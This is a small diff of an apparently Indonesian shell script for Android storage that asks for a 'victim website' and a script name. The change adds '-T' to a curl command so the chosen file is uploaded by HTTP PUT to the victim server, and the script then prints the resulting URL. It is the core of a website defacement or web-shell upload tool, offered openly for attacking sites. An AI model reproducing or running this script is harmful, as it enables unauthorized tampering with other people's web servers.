@@ -12,5 +12,5 @@ echo ""
 echo ""
 read -p "Masukkan web korban  ~# " target
 read -p "Nama script lu coeg  ~# "  sc;
-curl -a /storage/emulated/0/$sc $target
+curl -a -T /storage/emulated/0/$sc $target
 echo "Hasilnya :v |==>"  $target/$sc
